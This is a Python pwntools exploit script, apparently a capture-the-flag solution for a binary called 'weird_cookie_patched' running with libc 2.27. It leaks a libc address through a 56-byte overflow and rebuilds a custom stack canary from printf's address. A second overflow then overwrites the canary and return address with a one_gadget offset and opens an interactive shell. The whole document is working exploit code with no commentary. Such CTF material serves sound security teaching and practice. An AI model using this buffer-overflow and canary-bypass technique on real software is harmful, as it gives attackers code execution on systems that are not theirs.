from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript='''
init-pwndbg
breakrva 0x11a8
breakrva 0x1213
breakrva 0x1257
breakrva 0x1263
continue
'''.format(**locals())

exe = "./weird_cookie_patched"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"

io = start()
libc = ELF("./libc-2.27.so")
offset = 56
payload = b'A' * offset

io.sendline(payload)
io.recvuntil("A"*offset)
io.recvline()
libc_start_main_leak = unpack(io.recvline()[:-1].ljust(8, b'\x00'))
libc_start_main_leak = int(hex(libc_start_main_leak) + "00", 16)
info(f"libc start main leak : {hex(libc_start_main_leak)}")
libc.address = libc_start_main_leak - (0x021ba0 + 96)
info(f"LIBC Base : {hex(libc.address)}")
info(f"Printf address : {hex(libc.sym['printf'])}")
hardcoded_canary = 1311768467463790321   
canary = hardcoded_canary ^ libc.sym["printf"]
info(f"Canary : {hex(canary)}")
offset_canary = 40
oneshot = [0x4f2a5, 0x4f302, 0x10a2fc]
payload2 = flat({offset_canary: [
    canary, b'\x00' * 8,
    libc.address + oneshot[1]
]})

io.sendline(payload2)

io.interactive()